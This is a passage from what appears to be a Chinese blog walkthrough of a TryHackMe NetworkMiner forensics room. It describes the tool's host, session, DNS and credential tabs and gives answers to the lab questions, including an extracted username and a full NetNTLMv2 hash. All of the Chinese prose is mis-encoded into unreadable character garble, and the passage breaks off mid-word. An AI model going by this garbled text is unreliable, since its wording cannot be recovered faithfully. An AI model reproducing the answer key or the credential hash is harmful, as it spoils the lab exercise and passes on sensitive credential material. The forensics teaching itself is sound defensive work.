æ¥è°ƒæŸ¥æ•èŽ·çš„æµé‡ã€‚</p>\n<ul>\n<li>å­¦ä¹ ç›®æ ‡\n<ul>\n<li>äº†è§£ NetworkMiner æ˜¯ä»€ä¹ˆ</li>\n<li>å­¦ä¹  NetworkMiner çš„åŸºç¡€çŸ¥è¯†</li>\n<li>æµè§ˆä¸åŒçš„ä¿¡æ¯æ ‡ç­¾é¡µï¼Œé«˜æ•ˆæå–ä¿¡æ¯ã€‚</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"networkminer-åœ¨å–è¯ä¸­çš„åº”ç”¨\">NetworkMiner åœ¨å–è¯ä¸­çš„åº”ç”¨</h4>\n<p><img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/5f2fece3edb79f2301b7925642fab033.png\" /></p>\n<h5 id=\"ç½‘ç»œæŒ–æŽ˜åœ¨å–è¯ä¸­çš„åº”ç”¨\">ç½‘ç»œæŒ–æŽ˜åœ¨å–è¯ä¸­çš„åº”ç”¨</h5>\n<p>ç½‘ç»œå–è¯çš„æœ€ç»ˆç›®æ ‡æ˜¯æä¾›è¶³å¤Ÿçš„ä¿¡æ¯ï¼Œä»¥ä¾¿æ ¹æ®ç½‘ç»œæµé‡æ£€æµ‹æ¶æ„æ´»åŠ¨ã€å®‰å…¨æ¼æ´žå’Œç½‘ç»œå¼‚å¸¸ã€‚NetworkMiner æ˜¯ä¸€ä¸ªå¼ºå¤§çš„è¾…åŠ©å·¥å…·ï¼Œå®ƒå¯ä»¥å¿«é€Ÿæä¾›æœ‰ç”¨çš„çº¿ç´¢ï¼ŒæŒ‡å¯¼æ‚¨ä»Žä½•å¤„ç€æ‰‹ï¼Œå…·ä½“åŒ…æ‹¬ï¼š</p>\n<ul>\n<li>æ•èŽ·ä¸»æœºçš„ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œä¾‹å¦‚å…¶ IP åœ°å€å’Œ MAC åœ°å€ã€ä¸»æœºåæˆ–æ“ä½œç³»ç»Ÿä¿¡æ¯</li>\n<li>æ½œåœ¨æ”»å‡»æŒ‡æ ‡æˆ–å¼‚å¸¸æƒ…å†µåˆ—è¡¨ï¼Œä¾‹å¦‚æµé‡æ¿€å¢žæˆ–ç«¯å£æ‰«æ</li>\n<li>ç”¨äºŽæ‰§è¡Œæ½œåœ¨æ”»å‡»çš„å·¥å…·æˆ–å·¥å…·åŒ…ï¼Œä¾‹å¦‚Nmapã€‚</li>\n</ul>\n<h5 id=\"æ”¯æŒçš„æ•°æ®ç±»åž‹\">æ”¯æŒçš„æ•°æ®ç±»åž‹</h5>\n<p>ç½‘ç»œå–è¯ä¸­ä¸»è¦è°ƒæŸ¥ä¸‰ç§æ•°æ®ç±»åž‹ï¼š</p>\n<ul>\n<li><strong>å®žæ—¶è·¯å†µ</strong></li>\n<li><strong>æµé‡æ•èŽ·</strong></li>\n<li><strong>æ—¥å¿—æ–‡ä»¶</strong></li>\n</ul>\n<p>NetworkMiner èƒ½å¤Ÿå¤„ç†æ•°æ®åŒ…æ•èŽ·æ–‡ä»¶ ( PCAP ) å’Œå®žæ—¶æµé‡ã€‚å› æ­¤ï¼Œåœ¨æœ¬è®¨è®ºä¸­ï¼Œæˆ‘ä»¬å°†é‡ç‚¹å…³æ³¨å®žæ—¶æµé‡å’Œæ•èŽ·çš„æµé‡ã€‚</p>\n<h4 id=\"networkmineræ˜¯ä»€ä¹ˆ\">NetworkMineræ˜¯ä»€ä¹ˆï¼Ÿ</h4>\n<h5 id=\"networkminer-ç®€ä»‹\">NetworkMiner ç®€ä»‹</h5>\n<table>\n<thead>\n<tr>\n<th><strong>èƒ½åŠ›</strong></th>\n<th><strong>æè¿°</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>äº¤é€šå—…æŽ¢</strong></td>\n<td>å®ƒå¯ä»¥æ‹¦æˆªç½‘ç»œæµé‡ï¼Œå—…æŽ¢ç½‘ç»œæµé‡ï¼Œå¹¶æ”¶é›†å’Œè®°å½•é€šè¿‡ç½‘ç»œçš„æ•°æ®åŒ…ã€‚</td>\n</tr>\n<tr>\n<td><strong>è§£æžPCAPæ–‡ä»¶</strong></td>\n<td>å®ƒå¯ä»¥è§£æžpcapæ–‡ä»¶å¹¶è¯¦ç»†æ˜¾ç¤ºæ•°æ®åŒ…çš„å†…å®¹ã€‚</td>\n</tr>\n<tr>\n<td><strong>æ–¹æ¡ˆåˆ†æž</strong></td>\n<td>å®ƒå¯ä»¥ä»Žè§£æžåŽçš„pcapæ–‡ä»¶ä¸­è¯†åˆ«æ‰€ä½¿ç”¨çš„åè®®ã€‚</td>\n</tr>\n<tr>\n<td><strong>æ“ä½œç³»ç»ŸæŒ‡çº¹è¯†åˆ«</strong></td>\n<td>å®ƒå¯ä»¥é€šè¿‡è¯»å–pcapæ–‡ä»¶æ¥è¯†åˆ«æ‰€ä½¿ç”¨çš„æ“ä½œç³»ç»Ÿã€‚æ­¤åŠŸèƒ½é«˜åº¦ä¾èµ–äºŽ <a href=\"https://github.com/xnih/satori/\" rel=\"noopener nofollow\" target=\"_blank\">Satori</a> å’Œ <a href=\"https://lcamtuf.coredump.cx/p0f3/\" rel=\"noopener nofollow\" target=\"_blank\">p0f</a>ã€‚<a href=\"https://github.com/xnih/satori/\" rel=\"noopener nofollow\" target=\"_blank\"></a><a href=\"https://lcamtuf.coredump.cx/p0f3/\" rel=\"noopener nofollow\" target=\"_blank\"></a></td>\n</tr>\n<tr>\n<td><strong>æ–‡ä»¶æå–</strong></td>\n<td>å®ƒå¯ä»¥ä»Žè§£æžåŽçš„pcapæ–‡ä»¶ä¸­æå–å›¾åƒã€HTML æ–‡ä»¶å’Œç”µå­é‚®ä»¶ã€‚</td>\n</tr>\n<tr>\n<td><strong>å‡­è¯çªƒå–</strong></td>\n<td>å®ƒå¯ä»¥ä»Žè§£æžåŽçš„pcapæ–‡ä»¶ä¸­æå–å‡­æ®ã€‚</td>\n</tr>\n<tr>\n<td><strong>æ˜Žæ–‡å…³é”®è¯è§£æž</strong></td>\n<td>å®ƒå¯ä»¥ä»Žè§£æžåŽçš„pcapæ–‡ä»¶ä¸­æå–æ˜Žæ–‡å…³é”®å­—å’Œå­—ç¬¦ä¸²ã€‚</td>\n</tr>\n</tbody>\n</table>\n<p><a href=\"https://www.netresec.com/?page=NetworkMiner\" rel=\"noopener nofollow\" target=\"_blank\"><strong>æˆ‘ä»¬åœ¨è¿™ä¸ªæˆ¿é—´é‡Œä½¿ç”¨çš„æ˜¯ NetworkMiner å…è´¹ç‰ˆï¼Œä½†ä¸“ä¸šç‰ˆçš„åŠŸèƒ½è¦ä¸°å¯Œå¾—å¤šã€‚æ‚¨å¯ä»¥åœ¨è¿™é‡Œï¼šhttps://www.netresec.com/?page=NetworkMiner</strong></a><strong>æŸ¥çœ‹å…è´¹ç‰ˆå’Œä¸“ä¸šç‰ˆä¹‹é—´çš„åŒºåˆ«</strong> <strong>ã€‚</strong></p>\n<h5 id=\"æ“ä½œæ¨¡å¼\">æ“ä½œæ¨¡å¼</h5>\n<p>ä¸»è¦æœ‰ä¸¤ç§è¿è¡Œæ¨¡å¼ï¼š</p>\n<ul>\n<li><strong>å—…æŽ¢æ¨¡å¼</strong>ï¼šè™½ç„¶å®ƒå…·å¤‡å—…æŽ¢åŠŸèƒ½ï¼Œä½†å¹¶éžè®¾è®¡ç”¨äºŽä½œä¸ºå—…æŽ¢å™¨ä½¿ç”¨ã€‚å—…æŽ¢åŠŸèƒ½ä»…åœ¨ Windows ç³»ç»Ÿä¸Šå¯ç”¨ã€‚ä¸è¿‡ï¼Œå…¶ä»–åŠŸèƒ½åœ¨ Windows å’ŒLinux æ“ä½œç³»ç»Ÿä¸Šå‡å¯ç”¨ã€‚æ ¹æ®ç»éªŒï¼Œå—…æŽ¢åŠŸèƒ½çš„å¯é æ€§ä¸å¦‚å…¶ä»–åŠŸèƒ½ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å»ºè®®ä¸è¦å°†æ­¤å·¥å…·ç”¨ä½œä¸»è¦å—…æŽ¢å™¨ã€‚å³ä½¿è¯¥å·¥å…·çš„å®˜æ–¹æè¿°ä¸­æåˆ°å®ƒæ˜¯â€œç½‘ç»œå–è¯åˆ†æžå·¥å…·â€ï¼Œä½†å®ƒä¹Ÿå¯ä»¥ç”¨ä½œâ€œå—…æŽ¢å™¨â€ã€‚æ¢å¥è¯è¯´ï¼Œå®ƒæ˜¯ä¸€æ¬¾ç½‘ç»œå–è¯åˆ†æžå·¥å…·ï¼Œè™½ç„¶å…·å¤‡å—…æŽ¢åŠŸèƒ½ï¼Œä½†å®ƒå¹¶éžåƒ Wireshark å’Œ tcpdump é‚£æ ·çš„ä¸“ç”¨å—…æŽ¢å™¨ã€‚</li>\n<li><strong>æ•°æ®åŒ…è§£æž/å¤„ç†</strong>ï¼šNetworkMiner å¯ä»¥è§£æžæµé‡æ•èŽ·æ•°æ®ï¼Œä»¥ä¾¿å¿«é€Ÿæ¦‚è§ˆå’Œäº†è§£æ‰€åˆ†æžçš„æ•èŽ·æ•°æ®ã€‚å»ºè®®ä¸»è¦ä½¿ç”¨æ­¤æ“ä½œæ¨¡å¼ï¼Œä»¥ä¾¿åœ¨æ·±å…¥è°ƒæŸ¥ä¹‹å‰å…ˆèŽ·å–â€œå”¾æ‰‹å¯å¾—â€çš„ä¿¡æ¯ã€‚</li>\n</ul>\n<h5 id=\"ä¼˜ç‚¹å’Œç¼ºç‚¹\">ä¼˜ç‚¹å’Œç¼ºç‚¹</h5>\n<p>å¦‚å‰æ–‡æ‰€è¿°ï¼ŒNetworkMiner ä¸»è¦ç”¨äºŽèŽ·å–ç½‘ç»œæ¦‚è§ˆã€‚åœ¨å¼€å§‹åˆ†æžæµé‡æ•°æ®ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹ <strong>NetworkMiner çš„ä¼˜ç¼ºç‚¹ã€‚</strong></p>\n<p><strong>ä¼˜ç‚¹</strong></p>\n<ul>\n<li>æ“ä½œç³»ç»ŸæŒ‡çº¹è¯†åˆ«</li>\n<li>è½»æ¾æå–æ–‡ä»¶</li>\n<li>å‡­è¯çªƒå–</li>\n<li>æ˜Žæ–‡å…³é”®è¯è§£æž</li>\n<li>æ€»ä½“æ¦‚è¿°</li>\n</ul>\n<p><strong>ç¼ºç‚¹</strong></p>\n<ul>\n<li>åœ¨ä¸»åŠ¨å—…æŽ¢ä¸­ä¸èµ·ä½œç”¨</li>\n<li>ä¸é€‚ç”¨äºŽå¤§åž‹pcapåˆ†æž</li>\n<li>æœ‰é™è¿‡æ»¤</li>\n<li>å¹¶éžä¸ºäººå·¥äº¤é€šè°ƒæŸ¥è€Œè®¾è®¡</li>\n</ul>\n<h5 id=\"wireshark-å’Œ-networkminer-çš„åŒºåˆ«\">Wireshark å’Œ NetworkMiner çš„åŒºåˆ«</h5>\n<p>NetworkMiner å’Œ Wireshark çš„åŸºæœ¬åŠŸèƒ½ç›¸ä¼¼ï¼Œä½†ç”¨é€”ä¸åŒã€‚è™½ç„¶ä¸»è¦åŠŸèƒ½ç›¸åŒï¼Œä½†æŸäº›åŠŸèƒ½åœ¨ç‰¹å®šåº”ç”¨åœºæ™¯ä¸‹æ›´ä¸ºå¼ºå¤§ã€‚</p>\n<p>æœ€ä½³å®žè·µæ˜¯è®°å½•æµé‡ä»¥è¿›è¡Œç¦»çº¿åˆ†æžï¼Œä½¿ç”¨ NetworkMiner å¿«é€ŸæŸ¥çœ‹pcap æ–‡ä»¶ï¼Œç„¶åŽä½¿ç”¨ Wireshark è¿›è¡Œæ·±å…¥è°ƒæŸ¥ã€‚</p>\n<table>\n<thead>\n<tr>\n<th><strong>ç‰¹å¾</strong></th>\n<th><strong>ç½‘ç»œçŸ¿å·¥</strong></th>\n<th><strong>Wireshark</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>ç›®çš„</td>\n<td>å¿«é€Ÿæ¦‚è§ˆã€äº¤é€šåœ°å›¾å’Œæ•°æ®æå–</td>\n<td>æ·±å…¥åˆ†æž</td>\n</tr>\n<tr>\n<td>å›¾å½¢ç”¨æˆ·ç•Œé¢</td>\n<td>âœ…</td>\n<td>âœ…</td>\n</tr>\n<tr>\n<td>å—…é—»</td>\n<td>âœ…</td>\n<td>âœ…</td>\n</tr>\n<tr>\n<td>å¤„ç†PCAP</td>\n<td>âœ…</td>\n<td>âœ…</td>\n</tr>\n<tr>\n<td>æ“ä½œç³»ç»ŸæŒ‡çº¹è¯†åˆ«</td>\n<td>âœ…</td>\n<td>âŒ</td>\n</tr>\n<tr>\n<td>å‚æ•°/å…³é”®è¯å‘çŽ°</td>\n<td>âœ…</td>\n<td>æ‰‹åŠ¨çš„</td>\n</tr>\n<tr>\n<td>å‡­è¯å‘çŽ°</td>\n<td>âœ…</td>\n<td>âœ…</td>\n</tr>\n<tr>\n<td>æ–‡ä»¶æå–</td>\n<td>âœ…</td>\n<td>âœ…</td>\n</tr>\n<tr>\n<td>ç­›é€‰é€‰é¡¹</td>\n<td>æœ‰é™çš„</td>\n<td>âœ…</td>\n</tr>\n<tr>\n<td>æ•°æ®åŒ…è§£ç </td>\n<td>æœ‰é™çš„</td>\n<td>âœ…</td>\n</tr>\n<tr>\n<td>æ–¹æ¡ˆåˆ†æž</td>\n<td>âŒ</td>\n<td>âœ…</td>\n</tr>\n<tr>\n<td>æœ‰æ•ˆè½½è·åˆ†æž</td>\n<td>âŒ</td>\n<td>âœ…</td>\n</tr>\n<tr>\n<td>ç»Ÿè®¡åˆ†æž</td>\n<td>âŒ</td>\n<td>âœ…</td>\n</tr>\n<tr>\n<td>è·¨å¹³å°æ”¯æŒ</td>\n<td>âœ…</td>\n<td>âœ…</td>\n</tr>\n<tr>\n<td>ä¸»æœºåˆ†ç±»</td>\n<td>âœ…</td>\n<td>âŒ</td>\n</tr>\n<tr>\n<td>æ˜“äºŽç®¡ç†</td>\n<td>âœ…</td>\n<td>âœ…</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"å·¥å…·æ¦‚è¿°-1\">å·¥å…·æ¦‚è¿° 1</h4>\n<h5 id=\"é¦–é¡µ\">é¦–é¡µ</h5>\n<p>è¿™æ˜¯ NetworkMiner çš„é¦–é¡µã€‚æ‰“å¼€åº”ç”¨ç¨‹åºåŽï¼Œå°±ä¼šåŠ è½½æ­¤å±å¹•ã€‚</p>\n<h5 id=\"æ–‡ä»¶èœå•\">æ–‡ä»¶èœå•</h5>\n<p>æ–‡ä»¶èœå•å¯å¸®åŠ©æ‚¨åŠ è½½Pcapæ–‡ä»¶æˆ–é€šè¿‡ IP æŽ¥æ”¶Pcap æ–‡ä»¶ã€‚æ‚¨ä¹Ÿå¯ä»¥æ‹–æ”¾Pcapæ–‡ä»¶ã€‚NetworkMiner ä¹Ÿæ”¯æŒé€šè¿‡ IP æŽ¥æ”¶ Pcap æ–‡ä»¶ã€‚æœ¬æˆ¿é—´å»ºè®®å°† NetworkMiner ä½œä¸ºåˆæ­¥è°ƒæŸ¥å·¥å…·ï¼Œç”¨äºŽèŽ·å–æ˜“äºŽèŽ·å–çš„ä¿¡æ¯å’Œæµé‡æ¦‚è§ˆã€‚å› æ­¤ï¼Œæœ¬æˆ¿é—´å°†è·³è¿‡é€šè¿‡ IP æŽ¥æ”¶ Pcap æ–‡ä»¶çš„è®²è§£ã€‚æ‚¨å¯ä»¥ç‚¹å‡»<a href=\"https://www.netresec.com/?page=Blog&amp;month=2011-09&amp;post=Pcap-over-IP-in-NetworkMiner\" rel=\"noopener nofollow\" target=\"_blank\">æ­¤å¤„ï¼šhttps://www.netresec.com/?page=Blog&amp;month=2011-09&amp;post=Pcap-over-IP-in-NetworkMiner</a> å’Œ <a href=\"http://www.gavinhollinger.com/2016/10/pcap-over-ip-to-networkminer.html\" rel=\"noopener nofollow\" target=\"_blank\">æ­¤å¤„ï¼šhttp://www.gavinhollinger.com/2016/10/pcap-over-ip-to-networkminer.html</a>é˜…è¯»æœ‰å…³é€šè¿‡ IP æŽ¥æ”¶Pcap æ–‡ä»¶çš„æ›´å¤šä¿¡æ¯ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/b2d656f4f4802dc050471f0b0a2b25e9.png\" /></p>\n<h5 id=\"å·¥å…·èœå•\">å·¥å…·èœå•</h5>\n<p>å·¥å…·èœå•å¯å¸®åŠ©æ‚¨æ¸…é™¤ä»ªè¡¨æ¿å¹¶åˆ é™¤å·²æ•èŽ·çš„æ•°æ®ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/37da1733693f421ab77de35f61b5dadc.png\" /></p>\n<h5 id=\"å¸®åŠ©èœå•\">å¸®åŠ©èœå•</h5>\n<p>å¸®åŠ©èœå•æä¾›æœ‰å…³æ›´æ–°å’Œå½“å‰ç‰ˆæœ¬çš„ä¿¡æ¯ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/36ab110bbc53808677744d0c39e30a38.png\" /></p>\n<h5 id=\"æœºç®±é¢æ¿\">æœºç®±é¢æ¿</h5>\n<p>æ¡ˆä¾‹é¢æ¿æ˜¾ç¤ºå·²è°ƒæŸ¥çš„pcapæ–‡ä»¶åˆ—è¡¨ã€‚æ‚¨å¯ä»¥ä»Žæ­¤é¢æ¿é‡æ–°åŠ è½½/åˆ·æ–°ã€æŸ¥çœ‹å…ƒæ•°æ®è¯¦ç»†ä¿¡æ¯ä»¥åŠåˆ é™¤å·²åŠ è½½çš„æ–‡ä»¶ã€‚<br />\n<img alt=\"å¤–é“¾å›¾ç‰‡è½¬å­˜å¤±è´¥,æºç«™å¯èƒ½æœ‰é˜²ç›—é“¾æœºåˆ¶,å»ºè®®å°†å›¾ç‰‡ä¿å­˜ä¸‹æ¥ç›´æŽ¥ä¸Šä¼ \" src=\"https://img-home.csdnimg.cn/images/20230724024159.png?origin_url=https%3A%2F%2Fimg2024.cnblogs.com%2Fblog%2F3392862%2F202512%2F3392862-20251229081113966-1396539303.png&amp;pos_id=img-l2N7ugdJ-1767225916457\" /><br />\n<strong>æŸ¥çœ‹å·²åŠ è½½æ–‡ä»¶çš„å…ƒæ•°æ®</strong><br />\nä¸‹å›¾å±•ç¤ºäº†å¦‚ä½•æŸ¥çœ‹å·²åŠ è½½æ–‡ä»¶çš„å…ƒæ•°æ®<br />\n<img alt=\"500\" src=\"https://i-blog.csdnimg.cn/img_convert/b18bb9fa27485b70c1d9d4c1870c1da9.png\" /></p>\n<h5 id=\"ä¸»æœº\">ä¸»æœº</h5>\n<p>â€œä¸»æœºâ€èœå•æ˜¾ç¤ºpcapæ–‡ä»¶ä¸­å·²è¯†åˆ«çš„ä¸»æœºã€‚æœ¬éƒ¨åˆ†æä¾›ä»¥ä¸‹ä¿¡æ¯ï¼š</p>\n<ul>\n<li>IPåœ°å€</li>\n<li>MACåœ°å€</li>\n<li>æ“ä½œç³»ç»Ÿç±»åž‹</li>\n<li>å¼€æ”¾ç«¯å£</li>\n<li>å·²å‘é€/å·²æŽ¥æ”¶æ•°æ®åŒ…</li>\n<li>ä¼ å…¥/ä¼ å‡ºä¼šè¯</li>\n<li>æˆ¿ä¸œè¯¦æƒ…</li>\n</ul>\n<p>æ“ä½œç³»ç»ŸæŒ‡çº¹è¯†åˆ«ä½¿ç”¨ Satori GitHub ä»“åº“å’Œ p0fï¼ŒMAC åœ°å€æ•°æ®åº“ä½¿ç”¨ mac-ages GitHub ä»“åº“ã€‚</p>\n<p>æ‚¨å¯ä»¥ä½¿ç”¨æŽ’åºèœå•å¯¹å·²è¯†åˆ«çš„ä¸»æœºè¿›è¡ŒæŽ’åºã€‚æ‚¨è¿˜å¯ä»¥æ›´æ”¹ä¸»æœºçš„é¢œè‰²ã€‚æŸäº›åŠŸèƒ½ï¼ˆä¾‹å¦‚å¼€æºæƒ…æŠ¥æŸ¥æ‰¾ï¼‰ä»…åœ¨é«˜çº§ç‰ˆä¸­å¯ç”¨ã€‚å³é”®èœå•è¿˜å¯ä»¥å¸®åŠ©æ‚¨å¤åˆ¶é€‰å®šçš„å€¼ã€‚<br />\n<img alt=\"å¤–é“¾å›¾ç‰‡è½¬å­˜å¤±è´¥,æºç«™å¯èƒ½æœ‰é˜²ç›—é“¾æœºåˆ¶,å»ºè®®å°†å›¾ç‰‡ä¿å­˜ä¸‹æ¥ç›´æŽ¥ä¸Šä¼ \" src=\"https://img-home.csdnimg.cn/images/20230724024159.png?origin_url=https%3A%2F%2Fimg2024.cnblogs.com%2Fblog%2F3392862%2F202512%2F3392862-20251229081113191-1921133161.png&amp;pos_id=img-563I6b4N-1767225916457\" /></p>\n<h5 id=\"ä¼šè¯-1\">ä¼šè¯</h5>\n<p>ä¼šè¯èœå•æ˜¾ç¤ºpcapæ–‡ä»¶ä¸­æ£€æµ‹åˆ°çš„ä¼šè¯ã€‚æœ¬éƒ¨åˆ†æä¾›ä»¥ä¸‹ä¿¡æ¯ï¼š</p>\n<ul>\n<li>è½¦æž¶å·</li>\n<li>å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åœ°å€</li>\n<li>å§‹å‘æ¸¯å’Œç›®çš„æ¸¯</li>\n<li>åè®®</li>\n<li>å¼€å§‹æ—¶é—´<br />\n<img alt=\"å¤–é“¾å›¾ç‰‡è½¬å­˜å¤±è´¥,æºç«™å¯èƒ½æœ‰é˜²ç›—é“¾æœºåˆ¶,å»ºè®®å°†å›¾ç‰‡ä¿å­˜ä¸‹æ¥ç›´æŽ¥ä¸Šä¼ \" src=\"https://img-home.csdnimg.cn/images/20230724024159.png?origin_url=https%3A%2F%2Fimg2024.cnblogs.com%2Fblog%2F3392862%2F202512%2F3392862-20251229081112797-1207843029.png&amp;pos_id=img-s9a8g5v9-1767225916457\" /></li>\n</ul>\n<p>æ‚¨å¯ä»¥ä½¿ç”¨ç­›é€‰æ åœ¨æ¡†æž¶å†…æœç´¢å…³é”®è¯ã€‚ä¹Ÿå¯ä»¥ç­›é€‰ä¼šè¯èœå•çš„ç‰¹å®šåˆ—ã€‚æ­¤èœå•æŽ¥å—å››ç§ç±»åž‹çš„è¾“å…¥ï¼›</p>\n<ul>\n<li>â€œç²¾ç¡®çŸ­è¯­â€</li>\n<li>â€œAllWordsâ€</li>\n<li>â€œAnyWordâ€</li>\n<li>æ­£åˆ™è¡¨è¾¾å¼</li>\n</ul>\n<h5 id=\"dns-1\">DNS</h5>\n<p>DNSèœå•æ˜¾ç¤ºDNSæŸ¥è¯¢çš„è¯¦ç»†ä¿¡æ¯ã€‚æœ¬éƒ¨åˆ†æä¾›ä»¥ä¸‹ä¿¡æ¯ï¼š</p>\n<ul>\n<li>è½¦æž¶å·</li>\n<li>æ—¶é—´æˆ³</li>\n<li>å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨</li>\n<li>å§‹å‘æ¸¯å’Œç›®çš„æ¸¯</li>\n<li>IP TTL</li>\n<li>DNSæ—¶é—´</li>\n<li>äº¤æ˜“ ID å’Œç±»åž‹</li>\n<li>DNSæŸ¥è¯¢å’Œåº”ç­”</li>\n<li>AlexaæŽ’åå‰100ä¸‡</li>\n</ul>\n<p>éƒ¨åˆ†åŠŸèƒ½ï¼ˆä¾‹å¦‚ Alexa Top 1Mï¼‰ä»…åœ¨é«˜çº§ç‰ˆä¸­å¯ç”¨ã€‚æœç´¢æ ä¹Ÿåœ¨æ­¤ç‰ˆæœ¬ä¸­å¯ç”¨ã€‚<br />\n<img alt=\"500\" src=\"https://i-blog.csdnimg.cn/img_convert/ab59ad06218ea8bccfcc8d49e3ed8416.png\" /></p>\n<h5 id=\"è¯ä¹¦\">è¯ä¹¦</h5>\n<p>å‡­æ®èœå•æ˜¾ç¤ºä»Žå·²åˆ†æžçš„ pcap æ–‡ä»¶ä¸­æå–çš„å‡­æ®å’Œå¯†ç å“ˆå¸Œ <a href=\"https://tryhackme.com/room/hashingcrypto101\" rel=\"noopener nofollow\" target=\"_blank\">å€¼</a> ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ <a href=\"https://tryhackme.com/room/crackthehashlevel2\" rel=\"noopener nofollow\" target=\"_blank\">Hashcat</a> ï¼ˆ<a href=\"https://github.com/hashcat/hashcat\" rel=\"noopener nofollow\" target=\"_blank\">GitHub</a>ï¼‰å’Œ <a href=\"https://tryhackme.com/room/johntheripper0\" rel=\"noopener nofollow\" target=\"_blank\">John the Ripper</a>  ï¼ˆ<a href=\"https://github.com/openwall/john\" rel=\"noopener nofollow\" target=\"_blank\">GitHub</a>ï¼‰è§£å¯†æå–çš„å‡­æ®ã€‚NetworkMiner å¯ä»¥æå–çš„å‡­æ®åŒ…æ‹¬ï¼š</p>\n<ul>\n<li>Kerberoså“ˆå¸Œ</li>\n<li>NTLMå“ˆå¸Œ</li>\n<li>RDP cookie</li>\n<li>HTTP Cookie</li>\n<li>HTTPè¯·æ±‚</li>\n<li>IMAP</li>\n<li>FTP</li>\n<li>SMTP</li>\n<li>MS SQL</li>\n</ul>\n<p>å³é”®èœå•åœ¨è¿™é‡Œä¹Ÿå¾ˆæœ‰ç”¨ã€‚æ‚¨å¯ä»¥è½»æ¾å¤åˆ¶ç”¨æˆ·åå’Œå¯†ç ã€‚<br />\n<img alt=\"500\" src=\"https://i-blog.csdnimg.cn/img_convert/9d560bbd4933c3bdc4d649aedaed6c36.png\" /></p>\n<p>æ€»å…±æœ‰å¤šå°‘å¸§ï¼Ÿ<br />\n<img alt=\"500\" src=\"https://i-blog.csdnimg.cn/img_convert/c62e7155e54747ea201155eefc7beb59.png\" /><br />\n<img alt=\"500\" src=\"https://i-blog.csdnimg.cn/img_convert/040e6fc9ddb0a5bf149d9578f9b11ccd.png\" /></p>\n<pre><code class=\"language-python\">460\n</code></pre>\n<p>æœ‰å¤šå°‘ä¸ª IP åœ°å€ä¸Žä¸»æœº 145.253.2.203 ä½¿ç”¨ç›¸åŒçš„ MAC åœ°å€ï¼Ÿ<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/45aeb3427a068faee44087ca11e248d5.png\" /></p>\n<pre><code class=\"language-python\">2\n</code></pre>\n<p>ä¸»æœº 65.208.228.223 å‘é€äº†å¤šå°‘ä¸ªæ•°æ®åŒ…ï¼Ÿ<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/a13a473647c36f463aea8cb3d2c0c676.png\" /></p>\n<pre><code class=\"language-python\">72\n</code></pre>\n<p>ä¸»æœº 65.208.228.223 ä¸‹çš„ Web æœåŠ¡å™¨çš„bannerï¼Œå³æŒ‡çº¹ç±»åž‹æ˜¯ä»€ä¹ˆï¼Ÿ<br />\n<img alt=\"å¤–é“¾å›¾ç‰‡è½¬å­˜å¤±è´¥,æºç«™å¯èƒ½æœ‰é˜²ç›—é“¾æœºåˆ¶,å»ºè®®å°†å›¾ç‰‡ä¿å­˜ä¸‹æ¥ç›´æŽ¥ä¸Šä¼ \" src=\"https://img-home.csdnimg.cn/images/20230724024159.png?origin_url=https%3A%2F%2Fimg2024.cnblogs.com%2Fblog%2F3392862%2F202512%2F3392862-20251229081110100-1221067365.png&amp;pos_id=img-h8EX5CST-1767225916457\" /></p>\n<pre><code class=\"language-python\">apache\n</code></pre>\n<p>02694W-WIN10 ä¸»æœºçš„æå–ç”¨æˆ·åæ˜¯ä»€ä¹ˆï¼Ÿ<br />\n<img alt=\"å¤–é“¾å›¾ç‰‡è½¬å­˜å¤±è´¥,æºç«™å¯èƒ½æœ‰é˜²ç›—é“¾æœºåˆ¶,å»ºè®®å°†å›¾ç‰‡ä¿å­˜ä¸‹æ¥ç›´æŽ¥ä¸Šä¼ \" src=\"https://img-home.csdnimg.cn/images/20230724024159.png?origin_url=https%3A%2F%2Fimg2024.cnblogs.com%2Fblog%2F3392862%2F202512%2F3392862-20251229081109747-1539749994.png&amp;pos_id=img-vf3rB8uU-1767225916457\" /></p>\n<pre><code class=\"language-python\">#B\\Administrator\n</code></pre>\n<p>ç™»å½•åˆ° 02694W-WIN10 ä¸»æœºçš„ç”¨æˆ·çš„å·²æå–å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿè¯·è¾“å…¥å®Œæ•´çš„ NTLM å“ˆå¸Œå€¼ã€‚</p>\n<pre><code class=\"language-python\">$NETNTLMv2$#B$136B077D942D9A63$FBFF3C253926907AAAAD670A9037F2A5$01010000000000000094D71AE38CD60170A8D571127AE49E00000000020004003300420001001E003000310035003600360053002D00570049004E00310036002D004900520004001E0074006800720065006500620065006500730063006F002E0063006F006D0003003E003000310035003600360073002D00770069006E00310036002D00690072002E0074006800720065006500620065006500730063006F002E0063006F006D0005001E0074006800720065006500620065006500730063006F002E0063006F006D00070008000094D71AE38CD601060004000200000008003000300000000000000000000000003000009050B30CECBEBD73F501D6A2B88286851A6E84DDFAE1211D512A6A5A72594D340A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E00360036002E0033003600000000000000000000000000\n</code></pre>\n<h4 id=\"å·¥å…·æ¦‚è¿°-2\">å·¥å…·æ¦‚è¿° 2</h4>\n<h5 id=\"æ–‡ä»¶\">æ–‡ä»¶</h5>\n<p>æ–‡ä»¶èœå•æ˜¾ç¤ºä»Žå·²åˆ†æžçš„ pcap æ–‡ä»¶ä¸­æå–çš„æ–‡ä»¶ã€‚æœ¬éƒ¨åˆ†æä¾›ä»¥ä¸‹ä¿¡æ¯ï¼š</p>\n<ul>\n<li>è½¦æž¶å·</li>\n<li>æ–‡ä»¶å</li>\n<li>æ‰©å¤§</li>\n<li>å°ºå¯¸</li>\n<li>æºåœ°å€å’Œç›®æ 